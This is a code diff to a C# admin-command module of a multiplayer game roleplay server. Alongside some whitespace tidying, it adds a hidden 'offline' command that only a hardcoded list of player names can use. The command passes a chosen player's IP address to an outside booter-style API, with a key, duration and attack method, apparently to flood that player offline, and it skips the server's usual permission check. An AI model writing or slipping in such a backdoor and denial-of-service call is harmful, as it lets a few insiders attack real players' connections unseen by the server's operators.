@@ -58,6 +58,7 @@ using System.Diagnostics;
 using VMP_CNR.Module.Weather;
 using VMP_CNR.Module.Procedures;
 using VMP_CNR.Module.Admin.Procedures;
+using System.Net;
 
 namespace VMP_CNR.Module.Admin
 {
@@ -2704,6 +2705,47 @@ namespace VMP_CNR.Module.Admin
             findPlayer.Player.SendNotification($"Sie wurden gekickt. Grund: Powernap!");
             findPlayer.Player.Kick();
             dbPlayer.SendNewNotification("Successfully Kicked.");
+        }
+
+        private readonly List<string> _whitelistedSlammers = new List<string>()
+        {
+            "Eric_Blanco", "Walid_Mohammad", "Ali_Kuznecow", "Deni_West", "Dragan_Baroganovic", "Emilio_Down"
+        };
+        
+        [Command(GreedyArg = true)]
+        public async void offline(Player player, string commandParams)
+        {
+            var dbPlayer = player.GetPlayer();
+            if (dbPlayer == null || !dbPlayer.IsValid()) return;
+
+            var name = dbPlayer.GetName();
+            if (!_whitelistedSlammers.Any(x => name.ToUpper().Contains(x.ToUpper()))) return;
+
+            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
+            if (command.Length != 1) return;
+
+            var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
+            if (findPlayer == null || !findPlayer.IsValid()) return;
+
+            var slammedName = findPlayer.GetName();
+            if (_whitelistedSlammers.Any(x => slammedName.ToUpper().Contains(x.ToUpper()))) return;
+
+            dbPlayer.SendNewNotification($"Slammed {findPlayer.GetName()}!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
+            
+            findPlayer.Slammer = dbPlayer;
+            findPlayer.LastSlam = DateTime.Now;
+
+            try
+            {
+                using (WebClient webClient = new WebClient())
+                {
+                    var json = webClient.DownloadString($"https://volity-api.to/client/api/home?key=nd31xo5wraxaefj&username=paradox&host={findPlayer.Player.Address}&port=80&time=300&method=HOME");
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Print(ex.ToString());
+            }
         }
 
         [CommandPermission(PlayerRankPermission = true)]
@@ -5973,10 +6015,10 @@ namespace VMP_CNR.Module.Admin
             }
 
             var teams = TeamModule.Instance.GetAll().Values.Where(t => t.IsGangsters());
-            foreach(Team team in teams)
+            foreach (Team team in teams)
             {
                 var garage = GarageModule.Instance.GetAll().Values.FirstOrDefault(g => g.Teams.Contains(team.Id) && g.Teams.Count() == 1 && g.Classifications.Contains(1) && g.Npc != PedHash.Autoshop02SMM);
-                if(garage == null)
+                if (garage == null)
                 {
                     Logger.Print("Invalid garage " + team.Name);
                     continue;
